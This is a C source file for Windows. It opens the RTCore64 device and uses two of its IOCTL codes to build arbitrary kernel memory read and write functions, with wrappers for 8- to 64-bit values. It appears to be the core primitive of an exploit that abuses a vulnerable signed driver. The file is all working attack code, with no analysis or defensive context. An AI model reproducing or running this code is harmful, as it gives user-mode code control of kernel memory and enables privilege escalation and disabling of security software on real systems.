#include <windows.h>
#include <stdio.h>
#include <Psapi.h>


#define IOCTL_RTC_MEMORY_READ  0x80002048
#define IOCTL_RTC_MEMORY_WRITE 0x8000204C


typedef struct _RTC_MEMORY_READ {
    BYTE    Pad0[8];
    UINT64  Address;
    BYTE    Pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    Pad3[16];
} RTC_MEMORY_READ;

typedef struct _RTC_MEMORY_WRITE {
    BYTE    Pad0[8];
    UINT64  Address;
    BYTE    Pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    Pad3[16];
} RTC_MEMORY_WRITE;


static HANDLE  g_hDevice = INVALID_HANDLE_VALUE;

// Open the \\.\RTCore64 device
BOOL OpenRtCore()
{
    if (g_hDevice != INVALID_HANDLE_VALUE)
        return TRUE;

    g_hDevice = CreateFileW(
        L"\\\\.\\RTCore64",
        GENERIC_READ | GENERIC_WRITE,
        0,            
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (g_hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] OpenRtCore: CreateFile failed, error %u\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

// Generic read/write primitives
BOOL ReadKernelMemory(UINT64 Address, DWORD Size, DWORD *OutValue)
{
    RTC_MEMORY_READ req;
    ZeroMemory(&req, sizeof(req));
    req.Address = Address;
    req.Size    = Size;

    if (!OpenRtCore()) return FALSE;

    if (!DeviceIoControl(
            g_hDevice,
            IOCTL_RTC_MEMORY_READ,
            &req, sizeof(req),
            &req, sizeof(req),
            NULL, NULL))
    {
        printf("[-] ReadKernelMemory @ 0x%llx failed, error %u\n",
               Address, GetLastError());
        return FALSE;
    }

    *OutValue = req.Value;
    return TRUE;
}

BOOL WriteKernelMemory(UINT64 Address, DWORD Size, DWORD Value)
{
    RTC_MEMORY_WRITE req;
    ZeroMemory(&req, sizeof(req));
    req.Address = Address;
    req.Size    = Size;
    req.Value   = Value;

    if (!OpenRtCore()) return FALSE;

    if (!DeviceIoControl(
            g_hDevice,
            IOCTL_RTC_MEMORY_WRITE,
            &req, sizeof(req),
            &req, sizeof(req),
            NULL, NULL))
    {
        printf("[-] WriteKernelMemory @ 0x%llx failed, error %u\n",
               Address, GetLastError());
        return FALSE;
    }
    return TRUE;
}

// -----------------------------------------------------------------------------
// 4) Convenience wrappers for common sizes
// -----------------------------------------------------------------------------
BOOL Read8 (UINT64 addr, BYTE   *v) { DWORD tmp; if(!ReadKernelMemory(addr, 1, &tmp)) return FALSE; *v = (BYTE)(tmp & 0xFF);  return TRUE; }
BOOL Read16(UINT64 addr, WORD   *v) { DWORD tmp; if(!ReadKernelMemory(addr, 2, &tmp)) return FALSE; *v = (WORD)(tmp & 0xFFFF); return TRUE; }
BOOL Read32(UINT64 addr, DWORD  *v) { return ReadKernelMemory(addr, 4, v); }
BOOL Read64(UINT64 addr, UINT64 *v)
{
    DWORD low, high;
    if (!Read32(addr, &low) || !Read32(addr + 4, &high)) return FALSE;
    *v = ((UINT64)high << 32) | low;
    return TRUE;
}

BOOL Write8 (UINT64 addr, BYTE   v) { return WriteKernelMemory(addr, 1, v); }
BOOL Write16(UINT64 addr, WORD   v) { return WriteKernelMemory(addr, 2, v); }
BOOL Write32(UINT64 addr, DWORD  v) { return WriteKernelMemory(addr, 4, v); }
BOOL Write64(UINT64 addr, UINT64 v)
{
    DWORD low  = (DWORD)( v        & 0xFFFFFFFF);
    DWORD high = (DWORD)((v >> 32) & 0xFFFFFFFF);
    return Write32(addr, low) && Write32(addr + 4, high);
}